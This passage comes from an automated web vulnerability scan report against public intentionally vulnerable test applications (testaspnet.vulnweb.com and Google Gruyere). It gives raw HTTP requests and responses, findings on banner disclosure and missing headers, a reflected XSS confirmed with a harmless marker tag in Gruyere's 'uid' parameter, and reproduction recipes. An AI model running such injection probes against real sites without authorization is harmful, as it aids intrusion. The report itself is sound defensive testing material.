    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 705.7
  --- RAW REQUEST req-b3ec5432 (exactly as issued by the engine) ---
  POST /ReadNews.aspx?id=0&NewsAd=ads%2Fdef.html
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTM1MjIzMjU2OQ9kFgICAQ9kFgwCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc%2BYWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjUvMTYvMjAxOSAxMjozMjozMCBQTWQCBQ8WAh8BBT5BY3VuZXRpeCBWdWxuZXJhYmlsaXR5IFNjYW5uZXIgTm93IFdpdGggTmV0d29yayBTZWN1cml0eSBTY2Fuc2QCBw8WAh8BBbMePHA%2BPHN0cm9uZz5Mb25kb24sIFVLPC9zdHJvbmc%2BICZuZGFzaDsgPHN0cm9uZz5NYXkgMjAxOTwvc3Ryb25nPiAmbmRhc2g7IEFjdW5ldGl4LCB0aGUgcGlvbmVlciBpbiBhdXRvbWF0ZWQgd2ViIGFwcGxpY2F0aW9uIHNlY3VyaXR5IHNvZnR3YXJlLCBoYXMgYW5ub3VuY2VkIHRoYXQgYWxsIHZlcnNpb25zIG9mIHRoZSA8YSBocmVmPWh0dHBzOi8vd3d3LmFjdW5ldGl4LmNvbS92dWxuZXJhYmlsaXR5LXNjYW5uZXIvPkFjdW5ldGl4IFZ1bG5lcmFiaWxpdHkgU2Nhbm5lcjwvYT4gbm93IHN1cHBvcnQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vdnVsbmVyYWJpbGl0eS1zY2FubmVyL25ldHdvcmstc2VjdXJpdHktc2Nhbm5lci8%2BbmV0d29yayBzZWN1cml0eSBzY2FubmluZzwvYT4uIE5ldHdvcmsgc2VjdXJpdHkgc2NhbnMgYXJlIHBvc3NpYmxlIHRoYW5rcyB0byB0aGUgc2VhbWxlc3MgaW50ZWdyYXRpb24gb2YgQWN1bmV0aXggd2l0aCB0aGUgcG93ZXJmdWwgT3BlblZBUyBzZWN1cml0eSBzb2x1dGlvbi4gVW50aWwgbm93LCBuZXR3b3JrIHNlY3VyaXR5IHNjYW5uaW5nIGZ1bmN0aW9uYWxpdHkgd2FzIGF2YWlsYWJsZSBvbmx5IGluIEFjdW5ldGl4IE9ubGluZS48L3A%2BICAgICA8cD4mbGRxdW87Tm8gbWF0dGVyIHRoZSBzaXplIG9mIHlvdXIgYnVzaW5lc3MsIHlvdSB1c2UgbXVsdGlwbGUgc2VjdXJpdHkgbWVhc3VyZXMgdG8gYWxsZXZpYXRlIGRpZmZlcmVudCB0eXBlcyBvZiByaXNrcy4gWW91ciBzZWN1cml0eSBzdHJhdGVneSBtdXN0IGFsd2F5cyBpbmNsdWRlIGJvdGggd2ViIHNlY3VyaXR5IHNjYW5zIGFuZCBuZXR3b3JrIHNlY3VyaXR5IHNjYW5zLiBBbmQgaXQgbWFrZXMgaXQgc28gbXVjaCBlYXNpZXIgYW5kIG11Y2ggbW9yZSBlZmZpY2llbnQgaWYgeW91IGNhbiBkbyB0aGUgdHdvIHRvZ2V0aGVyIHVzaW5nIGEgc2luZ2xlIGludGVncmF0ZWQgdG9vbCwmcmRxdW87IHNhaWQgTmljb2xhcyBTY2liZXJyYXMsIENUTy48L3A%2BICAgICA8cD5UaGVyZSBhcmUgbWFueSBhZHZhbnRhZ2VzIG9mIHJ1bm5pbmcgbmV0d29yayBzZWN1cml0eSBzY2FucyBpbiBBY3VuZXRpeC4gSGF2aW5nIGEgc2luZ2xlIGludGVncmF0ZWQgZGFzaGJvYXJkIHdpdGggYm90aCB3ZWIgYW5kIG5ldHdvcmsgdnVsbmVyYWJpbGl0aWVzIGdpdmVzIHRoZSBiZXN0IHBvc3NpYmxlIHJpc2sgdmlzaWJpbGl0eSBhbmQgc2F2ZXMgYSBsb3Qgb2YgdGltZSBhbmQgZWZmb3J0LiBOZXR3b3JrIHNjYW5zIG1heSBhbHNvIGJlbmVmaXQgZnJvbSBvdGhlciBBY3VuZXRpeCBmZWF0dXJlcywgc3VjaCBhcyA8YSBocmVmPWh0dHBzOi8vd3d3LmFjdW5ldGl4LmNvbS92dWxuZXJhYmlsaXR5LXNjYW5uZXIvYWN1bmV0aXgtaW50ZWdyYXRpb25zLz5pc3N1ZSB0cmFja2VyIGludGVncmF0aW9uPC9hPiBhbmQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vdnVsbmVyYWJpbGl0eS1zY2FubmVyL3Z1bG5lcmFiaWxpdHktbWFuYWdlbWVudC1yZWd1bGF0b3J5LWNvbXBsaWFuY2UvPmNvbXByZWhlbnNpdmUgcmVwb3J0aW5nPC9hPi48L3A%2BICAgICA8cD48c3Ryb25nPk1vcmUgRmVhdHVyZXMgaW4gdGhlIExhdGVzdCBCdWlsZDwvc3Ryb25nPjwvcD4gICAgIDxwPk9wZW5WQVMgaW50ZWdyYXRpb24gaXMgaW50cm9kdWNlZCBhcyBwYXJ0IG9mIHRoZSBsYXRlc3QgQWN1bmV0aXggdmVyc2lvbiAxMiBidWlsZCAoPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vYmxvZy9yZWxlYXNlcy9uZXctYnVpbGQtbmV0d29yay1zY2FubmluZy1pbnRlZ3JhdGlvbi1pcHY2LXN1cHBvcnQvPmJ1aWxkIDEyLjAuMTkwNTE1MTQ5PC9hPikuIFRoaXMgbmV3IGJ1aWxkIGFsc28gaW5jbHVkZXM6PC9wPiAgICAgPHA%2BLSBTdXBwb3J0IGZvciBJUHY2PGJyIC8%2BICAgICAtIEltcHJvdmVkIHVzYWdlIG9mIG1hY2hpbmUgcmVzb3VyY2VzPGJyIC8%2BICAgICAtIEFkZGVkIHN1cHBvcnQgZm9yIFNlbGVuaXVtIHNjcmlwdHMgYXMgaW1wb3J0IGZpbGVzPGJyIC8%2BICAgICAtIE11bHRpcGxlIHZ1bG5lcmFiaWxpdHkgY2hlY2tzIGZvciBTQVA8YnIgLz4gICAgIC0gVW5hdXRob3JpemVkIGFjY2VzcyBkZXRlY3Rpb24gZm9yIFJlZGlzIGFuZCBNZW1jYWNoZWQ8YnIgLz4gICAgIC0gU291cmNlIGNvZGUgZGlzY2xvc3VyZSBmb3IgUnVieSBhbmQgUHl0aG9uPC9wPiAgICAgPHA%2BVGhlIG5ldyBidWlsZCBhbHNvIGluY2x1ZGVzIGEgbnVtYmVyIG9mIHVwZGF0ZXMgYW5kIGZpeGVzLCBhbGwgb2Ygd2hpY2ggYXJlIGF2YWlsYWJsZSBmb3IgYm90aCBXaW5kb3dzIGFuZCBMaW51eC4gTW9yZSBpbmZvcm1hdGlvbiBjYW4gYmUgZm91bmQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vYmxvZy9yZWxlYXNlcy9uZXctYnVpbGQtbmV0d29yay1zY2FubmluZy1pbnRlZ3JhdGlvbi1pcHY2LXN1cHBvcnQvPmhlcmU8L2E%2BLjwvcD4gICAgIDxwPkdldCBhIGRlbW8gb2YgdGhlIHByb2R1Y3QgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vbmV0d29yay1zZWN1cml0eS1zY2FubmVyLz5oZXJlPC9hPi48L3A%2BICAgICA8cD48c3Ryb25nPkFib3V0IEFjdW5ldGl4PC9zdHJvbmc%2BPC9wPiAgICAgPHA%2BVXNlci1mcmllbmRseSBhbmQgY29tcGV0aXRpdmVseSBwcmljZWQsIEFjdW5ldGl4IGxlYWRzIHRoZSBtYXJrZXQgaW4gYXV0b21hdGljIHdlYiBzZWN1cm
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22915
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:28:53 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 685.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/ReadNews.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F29] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/ReadNews.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-8fad38b9 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=2&NewsAd=ads%2Fdef.html
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 30585
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:13 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 711.9
  --- RAW REQUEST req-6e2ed2b8 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=0
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22818
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:42 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 705.7
  --- RAW REQUEST req-b3ec5432 (exactly as issued by the engine) ---
  POST /ReadNews.aspx?id=0&NewsAd=ads%2Fdef.html
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTM1MjIzMjU2OQ9kFgICAQ9kFgwCAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkAgMPFgIfAQVJcG9zdGVkIGJ5IDxzdHJvbmc%2BYWRtaW4gICAgICAgICAgICAgICAgICAgIDwvc3Ryb25nPjUvMTYvMjAxOSAxMjozMjozMCBQTWQCBQ8WAh8BBT5BY3VuZXRpeCBWdWxuZXJhYmlsaXR5IFNjYW5uZXIgTm93IFdpdGggTmV0d29yayBTZWN1cml0eSBTY2Fuc2QCBw8WAh8BBbMePHA%2BPHN0cm9uZz5Mb25kb24sIFVLPC9zdHJvbmc%2BICZuZGFzaDsgPHN0cm9uZz5NYXkgMjAxOTwvc3Ryb25nPiAmbmRhc2g7IEFjdW5ldGl4LCB0aGUgcGlvbmVlciBpbiBhdXRvbWF0ZWQgd2ViIGFwcGxpY2F0aW9uIHNlY3VyaXR5IHNvZnR3YXJlLCBoYXMgYW5ub3VuY2VkIHRoYXQgYWxsIHZlcnNpb25zIG9mIHRoZSA8YSBocmVmPWh0dHBzOi8vd3d3LmFjdW5ldGl4LmNvbS92dWxuZXJhYmlsaXR5LXNjYW5uZXIvPkFjdW5ldGl4IFZ1bG5lcmFiaWxpdHkgU2Nhbm5lcjwvYT4gbm93IHN1cHBvcnQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vdnVsbmVyYWJpbGl0eS1zY2FubmVyL25ldHdvcmstc2VjdXJpdHktc2Nhbm5lci8%2BbmV0d29yayBzZWN1cml0eSBzY2FubmluZzwvYT4uIE5ldHdvcmsgc2VjdXJpdHkgc2NhbnMgYXJlIHBvc3NpYmxlIHRoYW5rcyB0byB0aGUgc2VhbWxlc3MgaW50ZWdyYXRpb24gb2YgQWN1bmV0aXggd2l0aCB0aGUgcG93ZXJmdWwgT3BlblZBUyBzZWN1cml0eSBzb2x1dGlvbi4gVW50aWwgbm93LCBuZXR3b3JrIHNlY3VyaXR5IHNjYW5uaW5nIGZ1bmN0aW9uYWxpdHkgd2FzIGF2YWlsYWJsZSBvbmx5IGluIEFjdW5ldGl4IE9ubGluZS48L3A%2BICAgICA8cD4mbGRxdW87Tm8gbWF0dGVyIHRoZSBzaXplIG9mIHlvdXIgYnVzaW5lc3MsIHlvdSB1c2UgbXVsdGlwbGUgc2VjdXJpdHkgbWVhc3VyZXMgdG8gYWxsZXZpYXRlIGRpZmZlcmVudCB0eXBlcyBvZiByaXNrcy4gWW91ciBzZWN1cml0eSBzdHJhdGVneSBtdXN0IGFsd2F5cyBpbmNsdWRlIGJvdGggd2ViIHNlY3VyaXR5IHNjYW5zIGFuZCBuZXR3b3JrIHNlY3VyaXR5IHNjYW5zLiBBbmQgaXQgbWFrZXMgaXQgc28gbXVjaCBlYXNpZXIgYW5kIG11Y2ggbW9yZSBlZmZpY2llbnQgaWYgeW91IGNhbiBkbyB0aGUgdHdvIHRvZ2V0aGVyIHVzaW5nIGEgc2luZ2xlIGludGVncmF0ZWQgdG9vbCwmcmRxdW87IHNhaWQgTmljb2xhcyBTY2liZXJyYXMsIENUTy48L3A%2BICAgICA8cD5UaGVyZSBhcmUgbWFueSBhZHZhbnRhZ2VzIG9mIHJ1bm5pbmcgbmV0d29yayBzZWN1cml0eSBzY2FucyBpbiBBY3VuZXRpeC4gSGF2aW5nIGEgc2luZ2xlIGludGVncmF0ZWQgZGFzaGJvYXJkIHdpdGggYm90aCB3ZWIgYW5kIG5ldHdvcmsgdnVsbmVyYWJpbGl0aWVzIGdpdmVzIHRoZSBiZXN0IHBvc3NpYmxlIHJpc2sgdmlzaWJpbGl0eSBhbmQgc2F2ZXMgYSBsb3Qgb2YgdGltZSBhbmQgZWZmb3J0LiBOZXR3b3JrIHNjYW5zIG1heSBhbHNvIGJlbmVmaXQgZnJvbSBvdGhlciBBY3VuZXRpeCBmZWF0dXJlcywgc3VjaCBhcyA8YSBocmVmPWh0dHBzOi8vd3d3LmFjdW5ldGl4LmNvbS92dWxuZXJhYmlsaXR5LXNjYW5uZXIvYWN1bmV0aXgtaW50ZWdyYXRpb25zLz5pc3N1ZSB0cmFja2VyIGludGVncmF0aW9uPC9hPiBhbmQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vdnVsbmVyYWJpbGl0eS1zY2FubmVyL3Z1bG5lcmFiaWxpdHktbWFuYWdlbWVudC1yZWd1bGF0b3J5LWNvbXBsaWFuY2UvPmNvbXByZWhlbnNpdmUgcmVwb3J0aW5nPC9hPi48L3A%2BICAgICA8cD48c3Ryb25nPk1vcmUgRmVhdHVyZXMgaW4gdGhlIExhdGVzdCBCdWlsZDwvc3Ryb25nPjwvcD4gICAgIDxwPk9wZW5WQVMgaW50ZWdyYXRpb24gaXMgaW50cm9kdWNlZCBhcyBwYXJ0IG9mIHRoZSBsYXRlc3QgQWN1bmV0aXggdmVyc2lvbiAxMiBidWlsZCAoPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vYmxvZy9yZWxlYXNlcy9uZXctYnVpbGQtbmV0d29yay1zY2FubmluZy1pbnRlZ3JhdGlvbi1pcHY2LXN1cHBvcnQvPmJ1aWxkIDEyLjAuMTkwNTE1MTQ5PC9hPikuIFRoaXMgbmV3IGJ1aWxkIGFsc28gaW5jbHVkZXM6PC9wPiAgICAgPHA%2BLSBTdXBwb3J0IGZvciBJUHY2PGJyIC8%2BICAgICAtIEltcHJvdmVkIHVzYWdlIG9mIG1hY2hpbmUgcmVzb3VyY2VzPGJyIC8%2BICAgICAtIEFkZGVkIHN1cHBvcnQgZm9yIFNlbGVuaXVtIHNjcmlwdHMgYXMgaW1wb3J0IGZpbGVzPGJyIC8%2BICAgICAtIE11bHRpcGxlIHZ1bG5lcmFiaWxpdHkgY2hlY2tzIGZvciBTQVA8YnIgLz4gICAgIC0gVW5hdXRob3JpemVkIGFjY2VzcyBkZXRlY3Rpb24gZm9yIFJlZGlzIGFuZCBNZW1jYWNoZWQ8YnIgLz4gICAgIC0gU291cmNlIGNvZGUgZGlzY2xvc3VyZSBmb3IgUnVieSBhbmQgUHl0aG9uPC9wPiAgICAgPHA%2BVGhlIG5ldyBidWlsZCBhbHNvIGluY2x1ZGVzIGEgbnVtYmVyIG9mIHVwZGF0ZXMgYW5kIGZpeGVzLCBhbGwgb2Ygd2hpY2ggYXJlIGF2YWlsYWJsZSBmb3IgYm90aCBXaW5kb3dzIGFuZCBMaW51eC4gTW9yZSBpbmZvcm1hdGlvbiBjYW4gYmUgZm91bmQgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vYmxvZy9yZWxlYXNlcy9uZXctYnVpbGQtbmV0d29yay1zY2FubmluZy1pbnRlZ3JhdGlvbi1pcHY2LXN1cHBvcnQvPmhlcmU8L2E%2BLjwvcD4gICAgIDxwPkdldCBhIGRlbW8gb2YgdGhlIHByb2R1Y3QgPGEgaHJlZj1odHRwczovL3d3dy5hY3VuZXRpeC5jb20vbmV0d29yay1zZWN1cml0eS1zY2FubmVyLz5oZXJlPC9hPi48L3A%2BICAgICA8cD48c3Ryb25nPkFib3V0IEFjdW5ldGl4PC9zdHJvbmc%2BPC9wPiAgICAgPHA%2BVXNlci1mcmllbmRseSBhbmQgY29tcGV0aXRpdmVseSBwcmljZWQsIEFjdW5ldGl4IGxlYWRzIHRoZSBtYXJrZXQgaW4gYXV0b21hdGljIHdlYiBzZWN1cm
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22915
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:28:53 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 685.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/ReadNews.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

---

# TARGET: https://google-gruyere.appspot.com  (gruyere)

Authorization basis: Google Gruyere — public vulnerable test application (Google security codelab).

Scan record (as-run, unedited):
- run_id: run-228ffb67c9 | seed: 7f3c91aa | scanner: sentinel-core/4.2.1
- profile: see the raw scan JSON at build-v421/results/live_v421/gruyere.json
- requests: 527 | duration: 163.1s | rate_limit: {"limited": 0, "retries": 0, "recovered": 0}
- journal: 527 entries | dropped: 0
- OAST: {}
- engine verdict tally (as-is): 36 findings / 2 rejected / 0 unverified


## [GRUYERE F01] xss_reflected — high (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/snippets.gtl (parameter: `uid`)
- Engine verdict: verified via `re-test:variant-battery-6` | confidence 0.9 | rounds 6
- Verification notes (engine-recorded): 6/6 diverse vectors reflected raw (WAF-resistant verification)
- Impact (engine-assessed): proven — Arbitrary attacker-supplied markup/JavaScript survives into the response in an executable context (canary proven) — session theft, credential capture and action forgery in the victim's browser are reachable without further preconditions.
- Evidence chain (engine-recorded):
    * [unescaped_reflection] canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> <div class='refres… [ctx: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarker>pro41</sentinelxssmarker>      </h2> <div cl
    * [unescaped_reflection] canary reflected raw in context: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres… [ctx: …n> </div>  <div> <h2 class='has-refresh' id="user_name">    <sentinelxssmarkerpro42      </h2> <div class='refres…]
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0f971249 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/snippets.gtl?uid=%3Csentinelxssmarker%3Epro41%3C%2Fsentinelxssmarker%3E
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 3035
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:13 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: f6ad9c34bf74d8f7763def1c04bb20ae
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Snippets</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [163 more lines, 3034 chars total]
  elapsed_ms: 301.1
  --- RAW REQUEST req-8637ac85 (exactly as issued by the engine) ---
  GET /530506698111053146050861906974275631884/snippets.gtl?uid=%3Csentinelxssmarkerpro42
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 2972
    content-type: text/html
    date: Sat, 03 Oct 2026 01:34:16 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 0df469438ad056fee5c847b83eb6bc9f
    x-xss-protection: 0
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <!-- Copyright 2017 Google Inc. -->
    <html>
    <head>
    <title>Gruyere: Snippets</title>
    <style>
    /* Copyright 2017 Google Inc. */
    
    body, html, td, span, div, input, textarea {
      font-family: sans-serif;
      font-size: 14pt;
    }
    ... [163 more lines, 2971 chars total]
  elapsed_ms: 351.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/530506698111053146050861906974275631884/snippets.gtl with the tested parameter 'uid' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (unescaped_reflection)

## [GRUYERE F02] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0cef16e2 (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 11506
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:53 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 1f0ef0fae71537728a66be0a49f4a0ae
  body:
    <HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <TITLE>Web Application Exploits and Defenses</TITLE>
    <LINK type="text/css" rel="stylesheet" href="../static/codelab.css">
    <!--MARK-Z-->
    <SCRIPT>
    function toggleBlock(heading, whichID) {
      var image = heading.childNodes[0];
      var block = document.getElementById(whichID);
      if (block) {
        if (getDisplay(block) == 'block') {
          block.style.display = 'none';
          image.src = 'static/closed.gif';
    ... [76 more lines, 4000 chars total]
  elapsed_ms: 254.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F03] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/static/codelab.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-19cf18bf (exactly as issued by the engine) ---
  GET /static/codelab.css
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    age: 142
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: public, max-age=600
    content-encoding: gzip
    content-length: 740
    content-type: text/css
    date: Sat, 03 Oct 2026 01:30:32 GMT
    etag: "3m8CBg"
    expires: Sat, 03 Oct 2026 01:40:32 GMT
    server: Google Frontend
    x-cloud-trace-context: 99247fa6e62285221f1055a40a74dd7d
  body:
